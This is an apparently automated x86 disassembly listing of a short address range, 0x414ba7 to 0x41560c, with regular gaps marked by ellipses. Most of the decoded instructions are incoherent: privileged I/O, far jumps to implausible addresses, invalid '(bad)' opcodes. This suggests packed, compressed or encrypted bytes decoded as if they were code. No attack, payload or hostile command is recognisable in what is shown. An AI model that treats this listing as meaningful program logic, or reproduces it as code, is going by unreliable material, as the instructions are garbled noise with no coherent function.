  414ba7:	and    eax,0xde6e4e08
  414bac:	sub    al,0x8e
  414bae:	icebp  
  414baf:	es push ebp
  414bb1:	nop
  414bb2:	cmc    
  414bb3:	pop    eax
  414bb4:	(bad)
  414bb8:	imul   edi,ebx,0x56d23340
  414bbe:	enter  0xce28,0x1c
  414bc2:	mov    DWORD PTR [ebx],edi
  414bc4:	and    BYTE PTR [eax-0x2a331847],cl
  414bca:	push   eax
  414bcb:	mov    ebp,0x351a9f79
  414bd0:	push   ss
  414bd1:	or     esi,edx
  414bd3:	adc    al,0xe7
  414bd5:	outs   dx,BYTE PTR ds:[esi]
  414bd6:	mov    BYTE PTR [esi],dl
  414bd8:	xchg   ebp,eax
  414bd9:	jnp    0x414b77
  414bdb:	in     eax,0xf1
  414bdd:	aaa    
  414bde:	xor    cl,BYTE PTR [ecx-0x169d8424]
  414be4:	in     al,dx
  414be5:	aam    0x92
  414be7:	test   eax,0xbd08133e
  414bec:	push   edi
  414bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bee:	push   cs
  414bef:	push   0xffffffa9
  414bf1:	add    BYTE PTR [edx+0x5d461a9],cl
  414bf7:	mov    bh,0xca
  414bf9:	test   eax,0x7759d8f0
  414bfe:	inc    esp
  414bff:	jno    0x414c60
  414c01:	mov    ecx,0xa970c103
  414c06:	cdq    
  414c07:	shl    dl,cl
  414c09:	adc    al,0x69
  414c0b:	es sahf 
  414c0d:	out    0xd9,al
  414c0f:	xor    eax,0x74e050a
  414c14:	aad    0x22
  414c16:	int3   
  414c17:	popa   
  414c18:	mov    dl,0xf5
  414c1a:	mov    ds:0x6469fad0,al
  414c1f:	test   al,0x35
  414c21:	push   eax
  414c22:	pop    eax
  414c23:	cmp    al,0x5c
  414c25:	dec    eax
  414c26:	dec    ebp
  414c27:	stc    
  414c28:	mov    ds:0x1b64fe65,al
  414c2d:	neg    BYTE PTR [edi+0x7b]
  414c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c31:	or     BYTE PTR [ecx],ah
  414c33:	push   ss
  414c34:	inc    esp
  414c35:	xchg   edx,eax
  414c36:	aaa    
  414c37:	das    
  414c38:	lds    ebx,FWORD PTR [edx]
  414c3a:	sub    BYTE PTR [ebp+0x10],ah
  414c3d:	stos   BYTE PTR es:[edi],al
  414c3e:	jmp    0x72999353
  414c43:	loope  0x414c07
  414c45:	fwait
  414c46:	jno    0x414c8b
  414c48:	push   es
  414c49:	shl    DWORD PTR [eax+0x538851e6],cl
  414c4f:	inc    ebp
  414c50:	popf   
  414c51:	stos   DWORD PTR es:[edi],eax
  414c52:	xchg   esi,eax
  414c53:	sbb    DWORD PTR ds:0x66d45c4e,edi
  414c59:	in     al,dx
  414c5a:	adc    ebp,DWORD PTR [ecx]
  414c5c:	and    DWORD PTR [ecx+0x3cfcf39b],ecx
  414c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c63:	mov    bl,BYTE PTR [ecx]
  414c65:	iret   
  414c66:	adc    eax,0xd61b4d2d
  414c6b:	shrd   DWORD PTR [edx+0x0],ecx,0x0
	...
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	xor    al,0x64
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    ebp,DWORD PTR cs:[ebx-0x3a]
  414ce4:	sub    DWORD PTR ds:0xe067,edx
  414cea:	add    BYTE PTR [ecx],al
  414cec:	add    BYTE PTR [eax],al
  414cee:	scas   eax,DWORD PTR es:[edi]
  414cef:	mov    bh,0xf8
  414cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cf2:	or     ch,ah
  414cf4:	sub    ch,al
  414cf6:	jge    0x414cde
  414cf8:	dec    edi
  414cf9:	loope  0x414d55
  414cfb:	jb     0x414c91
  414cfd:	or     BYTE PTR [edi+ecx*4],ch
  414d00:	jmp    0xe6a0:0x95e45f5b
  414d07:	mov    edx,0x3b24c2cd
  414d0c:	xchg   esi,eax
  414d0d:	mov    eax,0xe6f778a3
  414d12:	fisubr WORD PTR [esi]
  414d14:	sub    bh,BYTE PTR [edx-0x6e84ed20]
  414d1a:	fsubr  DWORD PTR [esp+ebp*2-0x33]
  414d1e:	mov    ds:0xc088004d,al
  414d23:	pop    ss
  414d24:	mov    dl,0x8
  414d26:	push   cs
  414d27:	xchg   edi,eax
  414d28:	adc    edi,esi
  414d2a:	dec    ebx
  414d2b:	iret   
  414d2c:	jp     0x414d68
  414d2e:	leave  
  414d2f:	in     al,0x7
  414d31:	pop    eax
  414d32:	xor    edi,esi
  414d34:	js     0x414d24
  414d36:	iret   
  414d37:	jno    0x414d98
  414d39:	xchg   ecx,eax
  414d3a:	sub    ebx,ecx
  414d3c:	das    
  414d3d:	sahf   
  414d3e:	xor    BYTE PTR [esi+eiz*4-0x7a],0x1a
  414d43:	je     0x414d2f
  414d45:	pusha  
  414d46:	imul   esp,DWORD PTR [ecx+ecx*2],0x2196af0e
  414d4d:	mov    al,0xd3
  414d4f:	mov    BYTE PTR [edx-0x7fd4883b],bh
  414d55:	jbe    0x414d46
  414d57:	mov    esp,0x1ae621cb
  414d5c:	ret    
  414d5d:	add    esi,DWORD PTR [edx]
  414d5f:	dec    edx
  414d60:	out    0xfb,eax
  414d62:	jg     0x414db4
  414d64:	in     eax,dx
  414d65:	inc    esi
  414d66:	cld    
  414d67:	shl    BYTE PTR [esi],0xd7
  414d6a:	pop    ss
  414d6b:	(bad)  
  414d6c:	sbb    cl,cl
  414d6e:	imul   edx,DWORD PTR [ecx+eax*4-0x6c],0x5a
  414d73:	jae    0x414dd3
  414d75:	ds ja  0x414d70
  414d78:	mov    eax,ds:0xa7d5133a
  414d7d:	ror    BYTE PTR [esi+0x7],1
  414d80:	call   0xfbda:0x6e70d327
  414d87:	out    0x7,eax
  414d89:	adc    ah,BYTE PTR [ebp+0x48]
  414d8c:	test   al,0xac
  414d8e:	scas   eax,DWORD PTR es:[edi]
  414d8f:	(bad)  
  414d90:	jns    0x414de1
  414d92:	outs   dx,BYTE PTR ds:[esi]
  414d93:	fild   DWORD PTR [edx-0x37f8b3f4]
  414d99:	ins    DWORD PTR es:[edi],dx
  414d9a:	aam    0x23
  414d9c:	mov    al,ds:0x8dfec314
  414da1:	rol    DWORD PTR [ebx+edx*1+0x791be396],cl
  414da8:	mov    ds:0xf71d599d,eax
  414dad:	or     al,0xb4
  414daf:	jl     0x414d69
  414db1:	leave  
  414db2:	cmp    eax,0x147f586b
  414db7:	retf   0x7248
  414dba:	or     ecx,DWORD PTR [ebx]
  414dbc:	push   edx
  414dbd:	add    BYTE PTR [esi+0x2a95122f],al
  414dc3:	lods   eax,DWORD PTR ds:[esi]
  414dc4:	imul   ebx,DWORD PTR [edi-0x10],0xfc3ca9b0
  414dcb:	sbb    BYTE PTR [eax],0xed
  414dce:	lea    edx,[esi+0x4]
  414dd1:	sub    al,0xbd
  414dd3:	enter  0xcdf0,0x65
  414dd7:	xor    dh,BYTE PTR [ebx]
  414dd9:	or     al,0xbd
  414ddb:	icebp  
  414ddc:	or     eax,0x60730f1
  414de1:	repz sub edi,edi
  414de4:	cmp    al,BYTE PTR [edi-0x5f0d6818]
  414dea:	imul   edi,DWORD PTR [esi+esi*8],0xd5
	...
  414e55:	add    BYTE PTR [edi+0x3e911299],dh
  414e5b:	fwait
  414e5c:	mov    bh,0xbf
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x11406422
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [eax-0x42f6ed9f],bl
  414e73:	cmp    eax,0xb132b06f
  414e78:	les    ebx,FWORD PTR [ecx-0x7944d36e]
  414e7e:	mov    ds:0x97435ec7,eax
  414e83:	ja     0x414ee0
  414e85:	mov    ebp,0xbb19a39f
  414e8a:	pop    es
  414e8b:	cmp    al,0x1d
  414e8d:	enter  0xf51e,0x84
  414e91:	xchg   esi,eax
  414e92:	rcl    DWORD PTR [edx+eiz*8-0x7ff0fa40],1
  414e99:	pop    edi
  414e9a:	xor    DWORD PTR [edi+0x7524101d],esp
  414ea0:	xchg   ebx,eax
  414ea1:	push   ss
  414ea2:	mov    ch,0xf4
  414ea4:	aas    
  414ea5:	dec    ax
  414ea7:	fld    QWORD PTR [ebp+ecx*2+0x3f]
  414eab:	fcomp  QWORD PTR [ecx+0x63fcf57a]
  414eb1:	push   0xffffff83
  414eb3:	dec    esi
  414eb4:	push   ebp
  414eb5:	ins    BYTE PTR es:[edi],dx
  414eb6:	rcr    DWORD PTR [ecx-0x51b2614],cl
  414ebc:	mov    ds:0x6167283b,al
  414ec1:	shr    DWORD PTR [eax+0x67],cl
  414ec4:	and    esp,esi
  414ec6:	push   ebp
  414ec7:	cmp    DWORD PTR [ebx],ebx
  414ec9:	mov    ss,WORD PTR [edx+0x2bb28b9d]
  414ecf:	pop    es
  414ed0:	sti    
  414ed1:	(bad)  
  414ed2:	cmp    al,0x6e
  414ed4:	push   edx
  414ed5:	push   0xffffffe1
  414ed7:	clc    
  414ed8:	ror    BYTE PTR [eax-0x6604ae19],1
  414ede:	gs in  eax,dx
  414ee0:	scas   al,BYTE PTR es:[edi]
  414ee1:	ins    BYTE PTR es:[edi],dx
  414ee2:	iret   
  414ee3:	out    dx,eax
  414ee4:	jae    0x414efe
  414ee6:	je     0x414e8f
  414ee8:	ins    BYTE PTR es:[edi],dx
  414ee9:	jbe    0x414f3a
  414eeb:	repz push cs
  414eed:	ss cld 
  414eef:	popa   
  414ef0:	pop    esi
  414ef1:	daa    
  414ef2:	sbb    dh,BYTE PTR [edi+eiz*1-0xb]
  414ef6:	lahf   
  414ef7:	jne    0x414ee8
  414ef9:	mov    dl,0x38
  414efb:	outs   dx,BYTE PTR ds:[esi]
  414efc:	and    dh,0xd4
  414eff:	add    eax,edx
  414f01:	popa   
  414f02:	adc    bh,bl
  414f04:	sbb    esi,DWORD PTR [ebx+0x6]
  414f07:	(bad)  
  414f08:	das    
  414f09:	ret    
  414f0a:	jns    0x414eb2
  414f0c:	inc    edx
  414f0d:	and    eax,0xc9447a06
  414f12:	mov    dh,0xb7
  414f14:	ret    
  414f15:	popf   
  414f16:	jb     0x414eb2
  414f18:	mov    cl,0x69
  414f1a:	scas   eax,DWORD PTR es:[edi]
  414f1b:	popa   
  414f1c:	fst    DWORD PTR [edi]
  414f1e:	cmp    al,0xf8
  414f20:	xchg   ebp,eax
  414f21:	std    
  414f22:	test   eax,0x65e49136
  414f27:	(bad)  
  414f28:	retf   0xaec5
  414f2b:	jmp    0xdd5a105a
  414f30:	xchg   ebp,eax
  414f31:	shl    bh,cl
  414f33:	out    dx,eax
  414f34:	pop    esp
  414f35:	jecxz  0x414f55
  414f37:	xchg   BYTE PTR [ebx+0x31a9cc96],dh
  414f3d:	jb     0x414edb
  414f3f:	out    dx,al
  414f40:	in     al,dx
  414f41:	dec    ebx
  414f42:	jl     0x414f61
  414f44:	push   cs
  414f45:	jbe    0x414faa
  414f47:	mov    cs,WORD PTR [edx+0x59]
  414f4a:	fdivr  DWORD PTR [edx-0x4a80f220]
  414f50:	aad    0x83
  414f52:	(bad)  
  414f53:	adc    BYTE PTR [ebx+eax*8-0x7b9ad94d],ah
  414f5a:	loop   0x414f6a
  414f5c:	dec    ebx
  414f5d:	(bad)  
  414f5e:	aam    0x23
  414f60:	push   ebx
  414f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f62:	jo     0x414eec
  414f64:	repz idiv DWORD PTR [ebx]
  414f67:	add    edi,edi
  414f69:	les    esi,FWORD PTR [eax+ebp*2]
  414f6c:	xchg   edx,eax
  414f6d:	adc    eax,0x0
	...
  414fd6:	aaa    
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0x15443348
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	pcmpeqb mm0,QWORD PTR [ebx+edi*4-0x6f623c86]
  414ff6:	and    dl,BYTE PTR [esi]
  414ff8:	hlt    
  414ff9:	(bad)  [eax]
  414ffb:	outs   dx,DWORD PTR ds:[esi]
  414ffc:	das    
  414ffd:	sar    DWORD PTR ds:[esp+eax*4],1
  415001:	and    cl,BYTE PTR [edx-0x5b00dd02]
  415007:	pop    ecx
  415008:	jno    0x41500e
  41500a:	call   DWORD PTR [ebp+0x39124282]
  415010:	jnp    0x41507a
  415012:	cmp    al,BYTE PTR [ebx-0x324b1300]
  415018:	out    dx,eax
  415019:	fidivr WORD PTR [esp+eax*1+0x2dfcaf02]
  415020:	retf   
  415021:	mov    ds:0xf955e144,eax
  415026:	or     eax,0x29310d56
  41502b:	adc    eax,0x67257a6
  415030:	sub    ah,BYTE PTR [eax+eiz*4+0x4641e244]
  415037:	rcl    BYTE PTR [ecx-0x16],cl
  41503a:	cmp    al,0x5a
  41503c:	jecxz  0x4150a2
  41503e:	mov    ebp,0xb9689000
  415043:	push   esi
  415044:	or     eax,0xa1ee50d1
  415049:	mov    bh,0x33
  41504b:	sti    
  41504c:	jbe    0x414ff1
  41504e:	ins    DWORD PTR es:[edi],dx
  41504f:	stos   DWORD PTR es:[edi],eax
  415050:	mul    esp
  415052:	aam    0x76
  415054:	xor    BYTE PTR [eax],dl
  415056:	add    DWORD PTR [eax-0x53e96a7a],edi
  41505c:	out    dx,eax
  41505d:	hlt    
  41505e:	push   esp
  41505f:	loopne 0x41501b
  415061:	stc    
  415062:	push   ebp
  415063:	push   edx
  415064:	in     al,dx
  415065:	xor    DWORD PTR [edx-0x3b76a7a4],esp
  41506b:	pusha  
  41506c:	in     eax,0xb7
  41506e:	rcr    dl,0x9d
  415071:	les    ecx,FWORD PTR fs:[edi]
  415074:	jb     0x415052
  415076:	ds add al,0xe1
  415079:	stos   DWORD PTR es:[edi],eax
  41507a:	lods   eax,DWORD PTR ds:[esi]
  41507b:	dec    ebx
  41507c:	out    dx,al
  41507d:	dec    edx
  41507e:	add    al,0x46
  415080:	retf   
  415081:	sub    al,0xa5
  415083:	into   
  415084:	cs mov ebp,esi
  415087:	xor    esp,esp
  415089:	iret   
  41508a:	and    eax,0xfa8046c9
  41508f:	mov    ebx,0x860495d9
  415094:	jbe    0x4150e6
  415096:	es mov eax,0xea189438
  41509c:	mov    dh,0x30
  41509e:	leave  
  41509f:	(bad)
  4150a2:	sub    al,0xaa
  4150a4:	xor    BYTE PTR [esi+ecx*1-0x22081e49],dh
  4150ab:	retf   0x30a3
  4150ae:	(bad)  
  4150af:	cmp    eax,edi
  4150b1:	xchg   edi,eax
  4150b2:	loope  0x41507c
  4150b4:	xchg   esi,eax
  4150b5:	add    ch,cl
  4150b7:	sbb    edx,edi
  4150b9:	sahf   
  4150ba:	and    bl,ah
  4150bc:	cmc    
  4150bd:	push   0x2b
  4150bf:	lock and eax,0xfa0caaf9
  4150c5:	jle    0x4150e5
  4150c7:	stc    
  4150c8:	rol    DWORD PTR [eax],1
  4150ca:	fs push ecx
  4150cc:	lods   eax,DWORD PTR ds:[esi]
  4150cd:	test   BYTE PTR [edx+ecx*1+0xcd49593],bh
  4150d4:	div    BYTE PTR [esi-0x80b66b5]
  4150da:	leave  
  4150db:	xor    al,0x33
  4150dd:	(bad)  
  4150de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150df:	lods   eax,DWORD PTR ds:[esi]
  4150e0:	mov    ebp,0xab744476
  4150e5:	mov    DWORD PTR [ecx],0xc0c07914
  4150eb:	fsubr  DWORD PTR [esi+0x7b]
	...
  415156:	jnp    0x41515a
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x3f69fc2d
  415164:	dec    esp
  415165:	stc    
  415166:	jcxz   0x415169
  415169:	add    BYTE PTR [eax],al
  41516b:	add    DWORD PTR [eax],eax
  41516d:	add    BYTE PTR [eax],dh
  41516f:	dec    ebp
  415170:	into   
  415171:	cdq    
  415172:	xor    al,0x5
  415174:	into   
  415175:	mov    edx,0xa680e2f2
  41517a:	addr16 push ecx
  41517c:	pop    ss
  41517d:	icebp  
  41517e:	outs   dx,BYTE PTR ds:[esi]
  41517f:	scas   al,BYTE PTR es:[edi]
  415180:	jns    0x415180
  415182:	pop    ecx
  415183:	dec    edx
  415184:	xchg   ebp,eax
  415185:	loopne 0x41519a
  415187:	xor    ebp,DWORD PTR [edx-0x50e59e8e]
  41518d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518e:	mov    ch,0x3a
  415190:	int    0xac
  415192:	(bad)  
  415193:	mov    bl,0xfb
  415195:	push   ebp
  415196:	pop    es
  415197:	fld    st(6)
  415199:	xchg   ebp,eax
  41519a:	pop    esp
  41519b:	push   edx
  41519c:	test   DWORD PTR [esi+0x3fef36f1],eax
  4151a2:	jns    0x41520a
  4151a4:	xlat   BYTE PTR ds:[ebx]
  4151a5:	jecxz  0x415177
  4151a7:	lahf   
  4151a8:	xor    eax,0x6b574637
  4151ad:	sar    ebp,1
  4151af:	pop    esi
  4151b0:	sbb    BYTE PTR ds:0x3998365b,bh
  4151b6:	lods   al,BYTE PTR ds:[esi]
  4151b7:	out    dx,eax
  4151b8:	fnsave [esp+edx*1+0x8]
  4151bc:	and    BYTE PTR [ecx+ecx*2-0x69],ah
  4151c0:	leave  
  4151c1:	fwait
  4151c2:	xor    dh,BYTE PTR [edx]
  4151c4:	jmp    0x84ab:0xa3e657cc
  4151cb:	and    eax,0xd0eac523
  4151d0:	xchg   esp,eax
  4151d1:	inc    edx
  4151d2:	mov    esi,0xfbdc23bc
  4151d7:	fcom   DWORD PTR [esi-0x3]
  4151da:	cwde   
  4151db:	pop    ss
  4151dc:	loopne 0x415242
  4151de:	enter  0xf420,0xbd
  4151e2:	xchg   ecx,eax
  4151e3:	cmp    ebp,edi
  4151e5:	push   ebx
  4151e6:	mov    dl,0x96
  4151e8:	fdiv   DWORD PTR [edi+edi*4-0x5cf31fb7]
  4151ef:	push   0x6b
  4151f1:	jg     0x4151d8
  4151f3:	mov    ebp,0x96b80c0a
  4151f8:	stc    
  4151f9:	sbb    bh,BYTE PTR [edx-0x6ef73289]
  4151ff:	iret   
  415200:	dec    DWORD PTR [ebp+edi*2-0x78]
  415204:	jbe    0x4151a5
  415206:	retf   0xfc06
  415209:	fucom  st(5)
  41520b:	pop    ecx
  41520c:	xchg   ebp,eax
  41520d:	pusha  
  41520e:	xchg   esi,eax
  41520f:	or     bh,dl
  415211:	push   edi
  415212:	and    eax,0xc90417cf
  415217:	lods   al,BYTE PTR ds:[esi]
  415218:	inc    eax
  415219:	mov    bh,0xfc
  41521b:	xor    ebx,DWORD PTR [esp+edi*1+0x4b9f8cc5]
  415222:	sub    eax,0x509af2bd
  415227:	or     edi,ecx
  415229:	les    edi,FWORD PTR [edi]
  41522b:	pop    es
  41522c:	(bad)  
  41522d:	test   DWORD PTR [ebp+ecx*4-0x11b173d],ebp
  415234:	test   al,0xc1
  415236:	mov    esp,0xd74896d6
  41523b:	retf   
  41523c:	sub    al,0xb
  41523e:	push   ss
  41523f:	inc    esp
  415240:	pop    ss
  415241:	lahf   
  415242:	or     dl,BYTE PTR [eax+0x2e]
  415245:	mov    al,0x16
  415247:	aas    
  415248:	mov    ebx,DWORD PTR [esi-0x223f0614]
  41524e:	gs mov dl,0xc9
  415251:	sub    al,0xa5
  415253:	jmp    0x1af98f88
  415258:	ins    DWORD PTR es:[edi],dx
  415259:	ja     0x4152c7
  41525b:	mov    bh,0xd2
  41525d:	loop   0x4152b1
  41525f:	add    al,cl
  415261:	pusha  
  415262:	xlat   BYTE PTR ds:[ebx]
  415263:	shl    BYTE PTR [edi+0x6dcc141f],1
  415269:	cli    
  41526a:	xchg   DWORD PTR [edi-0x4e],edi
  41526d:	lock add BYTE PTR [eax],al
	...
  4152d4:	add    BYTE PTR [eax],al
  4152d6:	sub    al,0x97
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0xa18aa30b
  4152e5:	fsub   QWORD PTR [edi-0x1c]
  4152e8:	add    BYTE PTR [eax],al
  4152ea:	add    BYTE PTR [ecx],al
  4152ec:	add    BYTE PTR [eax],al
  4152ee:	cmp    al,BYTE PTR [ebx]
  4152f0:	inc    esp
  4152f1:	test   BYTE PTR [edi-0x28],ch
  4152f4:	sub    ecx,ecx
  4152f6:	clc    
  4152f7:	push   ds
  4152f8:	shl    bh,1
  4152fa:	jg     0x415317
  4152fc:	xchg   DWORD PTR [esi],ebp
  4152fe:	dec    edi
  4152ff:	sbb    BYTE PTR [esi],ah
  415301:	arpl   WORD PTR [ebx],cx
  415303:	adc    eax,0x245564ed
  415308:	jl     0x4152ec
  41530a:	add    BYTE PTR [eax+eiz*8-0x35],ah
  41530e:	sub    edi,DWORD PTR [ebx+0x4b]
  415311:	xchg   ebp,eax
  415312:	sbb    eax,0xb5a62c34
  415317:	xchg   BYTE PTR [ebx-0x3d],bl
  41531a:	xor    al,0x36
  41531c:	pusha  
  41531d:	and    cl,BYTE PTR [ebx+0x1]
  415320:	sub    BYTE PTR [esi+0x11],0xcd
  415324:	cmp    BYTE PTR [esp+edi*1+0x6e],dh
  415328:	mov    dl,0x97
  41532a:	rol    BYTE PTR [ebp-0x21],cl
  41532d:	ss jno 0x41537a
  415330:	mov    DWORD PTR [edx],ebx
  415332:	lds    ebp,FWORD PTR ds:0x1313dfc4
  415338:	xchg   esi,eax
  415339:	dec    ebp
  41533a:	cdq    
  41533b:	xor    BYTE PTR [ebx-0x35],ah
  41533e:	stc    
  41533f:	push   eax
  415340:	icebp  
  415341:	bound  ebp,QWORD PTR [eax]
  415343:	test   DWORD PTR [edi-0x72],ebp
  415346:	dec    ebx
  415347:	pop    edi
  415348:	not    ebp
  41534a:	jg     0x415369
  41534c:	dec    ebx
  41534d:	ds push ebx
  41534f:	(bad)
  415353:	pop    ebp
  415354:	cmp    al,0x5a
  415356:	jns    0x41536f
  415358:	cwde   
  415359:	mov    bh,0x49
  41535b:	push   ebp
  41535c:	retf   0x21b3
  41535f:	jl     0x415307
  415361:	jo     0x415354
  415363:	dec    esp
  415364:	sbb    DWORD PTR [ebp+0x62c9459b],edi
  41536a:	pop    ss
  41536b:	fwait
  41536c:	mov    ch,0x96
  41536e:	mov    edi,esp
  415370:	(bad)  
  415371:	call   0x8e6f4046
  415376:	cmp    DWORD PTR [ebp+0x29],eax
  415379:	mov    al,0x28
  41537b:	sbb    DWORD PTR [ecx+0x373fcc2d],ebp
  415381:	jne    0x4153db
  415383:	fdivr  st(4),st
  415385:	dec    edx
  415386:	and    ebx,DWORD PTR [esi-0x4d]
  415389:	jge    0x41534a
  41538b:	cdq    
  41538c:	cli    
  41538d:	imul   edx,DWORD PTR [eax-0x26335dc1],0xb804e3de
  415397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415398:	(bad)  
  415399:	adc    ah,BYTE PTR [ecx]
  41539b:	cmp    dl,BYTE PTR [edx+0x49]
  41539e:	aam    0x55
  4153a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153a1:	ins    DWORD PTR es:[edi],dx
  4153a2:	nop
  4153a3:	mov    dl,0x2
  4153a5:	inc    esi
  4153a6:	cmp    eax,0xfa017e63
  4153ab:	jne    0x415375
  4153ad:	not    DWORD PTR [ebx+0x47]
  4153b0:	pop    ss
  4153b1:	stos   BYTE PTR es:[edi],al
  4153b2:	cmp    BYTE PTR [edi+0x2dd3bb7b],ah
  4153b8:	retf   0xf49f
  4153bb:	and    BYTE PTR [eax],0xab
  4153be:	addr16 aas 
  4153c0:	xor    BYTE PTR [edx+0x50a512a3],ah
  4153c6:	push   edx
  4153c7:	fcompp 
  4153c9:	js     0x415430
  4153cb:	test   BYTE PTR [edi-0x3f1d8813],bh
  4153d1:	cwde   
  4153d2:	xchg   edx,eax
  4153d3:	out    dx,eax
  4153d4:	mov    esi,0xe97737a3
  4153d9:	sahf   
  4153da:	(bad)
  4153de:	push   edi
  4153df:	and    bh,bl
  4153e1:	outs   dx,BYTE PTR ds:[esi]
  4153e2:	rol    DWORD PTR [eax+0x539d7dba],1
  4153e8:	ret    
  4153e9:	mov    ah,0xdf
  4153eb:	inc    esi
  4153ec:	mov    edi,0xb1
	...
  415455:	add    BYTE PTR [ebp-0x10],ch
  415458:	repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0x6ad3e5b0
  415463:	adc    ebp,DWORD PTR [edx]
  415465:	xchg   edi,eax
  415466:	addr16 in eax,0x0
  415469:	add    BYTE PTR [eax],al
  41546b:	add    DWORD PTR [eax],eax
  41546d:	add    BYTE PTR [ebx],bh
  41546f:	cli    
  415470:	mov    edi,edi
  415472:	jle    0x415468
  415474:	stos   DWORD PTR es:[edi],eax
  415475:	pop    edi
  415476:	push   ebx
  415477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415478:	xchg   ebp,eax
  415479:	cmc    
  41547a:	test   DWORD PTR ds:0xf93fa58a,edx
  415480:	xchg   ebp,eax
  415481:	leave  
  415482:	mov    ebx,0x5dcd6a70
  415487:	mov    edi,0x9a0813a4
  41548c:	sahf   
  41548d:	jb     0x415418
  41548f:	cmp    bl,BYTE PTR [edx+0x3e]
  415492:	cmp    ah,BYTE PTR [ebx-0x67]
  415495:	sbb    dl,BYTE PTR [ebp+0x27969a14]
  41549b:	inc    esi
  41549c:	jmp    0x4154ec
  41549e:	pop    edi
  41549f:	test   eax,0x38eaff9a
  4154a4:	cmp    DWORD PTR [ecx],0x3fb0dd88
  4154aa:	lods   al,BYTE PTR ds:[esi]
  4154ab:	jns    0x415499
  4154ad:	arpl   WORD PTR [eax-0x62],bp
  4154b0:	out    0xa7,eax
  4154b2:	push   esi
  4154b3:	push   0xf
  4154b5:	(bad)  
  4154b6:	stos   DWORD PTR es:[edi],eax
  4154b7:	popa   
  4154b8:	test   eax,0x7d1775f
  4154bd:	xor    esp,ebp
  4154bf:	repnz int 0x5
  4154c2:	inc    eax
  4154c3:	pop    edx
  4154c4:	fmul   QWORD PTR [esi-0x274acceb]
  4154ca:	pop    ecx
  4154cb:	(bad)  
  4154cc:	in     al,0xd7
  4154ce:	cli    
  4154cf:	je     0x41546a
  4154d1:	sbb    ebx,ecx
  4154d3:	inc    ebp
  4154d4:	jb     0x415536
  4154d6:	cmp    eax,0x1144b32a
  4154db:	sbb    edi,DWORD PTR [edx]
  4154dd:	sbb    ch,BYTE PTR [edi]
  4154df:	inc    esi
  4154e0:	js     0x415520
  4154e2:	lahf   
  4154e3:	sbb    al,0x19
  4154e5:	jo     0x415480
  4154e7:	mov    dh,0xa2
  4154e9:	push   eax
  4154ea:	ja     0x415559
  4154ec:	(bad)  
  4154ed:	lock lods eax,DWORD PTR ds:[esi]
  4154ef:	xchg   DWORD PTR ds:0xb1ca4714,ecx
  4154f5:	jae    0x4154b8
  4154f7:	leave  
  4154f8:	outs   dx,BYTE PTR ds:[esi]
  4154f9:	and    eax,0xd623ce70
  4154fe:	push   es
  4154ff:	sbb    bl,BYTE PTR [eax-0x23]
  415502:	mov    bh,0xe
  415504:	sbb    edx,ecx
  415506:	int    0xb9
  415508:	mov    al,0x39
  41550a:	jno    0x41550c
  41550c:	mov    edx,0xd2b62603
  415511:	xchg   BYTE PTR [eax],bl
  415513:	aad    0xaf
  415515:	mov    ah,0x3
  415517:	xor    DWORD PTR [edi+0x6661773e],ecx
  41551d:	lahf   
  41551e:	fild   DWORD PTR [ecx+esi*1-0x5e9aeaaf]
  415525:	clc    
  415526:	xor    eax,0xcff6afbe
  41552b:	xor    al,0x31
  41552d:	jge    0x4154f5
  41552f:	pop    ds
  415530:	bound  eax,QWORD PTR [ebx]
  415532:	inc    ebx
  415533:	sub    dh,al
  415535:	cs inc ebx
  415537:	cwde   
  415538:	add    al,0x25
  41553a:	and    eax,0x630f0595
  41553f:	push   es
  415540:	pop    ebp
  415541:	push   eax
  415542:	and    eax,0xcc5ee820
  415547:	jmp    0xbec0:0xeb7fa160
  41554e:	mov    dl,0x2a
  415550:	int    0xa5
  415552:	sub    DWORD PTR [ebp-0x49],0x8176001
  415559:	pop    edx
  41555a:	adc    dh,BYTE PTR [ebx]
  41555c:	pusha  
  41555d:	(bad)  
  41555e:	push   cs
  41555f:	iret   
  415560:	pop    DWORD PTR [ebp-0x7ea110fe]
  415566:	and    al,0xea
  415568:	mov    es,WORD PTR [eax-0x2b]
  41556b:	jmp    0x0:0x9091
	...
  4155d6:	in     al,0xf0
  4155d8:	sub    DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x4155f3
  4155e3:	mov    ch,0xd8
  4155e5:	or     eax,0xe667
  4155ea:	add    BYTE PTR [ecx],al
  4155ec:	add    BYTE PTR [eax],al
  4155ee:	mov    eax,0xe26f794b
  4155f3:	inc    eax
  4155f4:	mov    bh,0x2c
  4155f6:	or     al,0x85
  4155f8:	lea    ecx,[ebx]
  4155fa:	xchg   ebp,eax
  4155fb:	fdivr  QWORD PTR [esi-0x39]
  4155fe:	mov    eax,0xb76b4c41
  415603:	mov    al,ds:0x92aec83a
  415608:	xrelease mov DWORD PTR [ebp+0x1a],edx
  41560c:	loopne 0x4155d5
